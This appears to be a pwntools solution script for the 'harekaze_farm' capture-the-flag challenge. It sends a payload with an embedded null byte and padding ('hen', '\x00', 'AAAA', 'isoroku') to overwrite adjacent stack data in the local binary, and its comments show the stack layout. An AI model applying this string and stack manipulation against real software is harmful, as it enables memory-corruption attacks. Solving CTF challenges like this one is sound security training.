#harekaze_farm

from pwn import *

e = ELF("./harekaze_farm")

p = process("./harekaze_farm")


# print(p.recv())

# p.sendline("cow")
# print(p.recv())

# p.sendline("sheep")
# print(p.recv())

# p.sendline("hen\x00\x00\x00\x00isoroku")
print(p.recv())

p.sendline("cow")
print(p.recv())

payload="hen"+"\x00" + ("A"*4) +"isoroku"+"\x00"

#     --- Stack ---
# 0x41414141006e6568 ('hen')
# 0x756b6f726f7369 ('isoroku')

# The A's fill in the rest of the address,

p.sendline(payload)

print p.recvall()



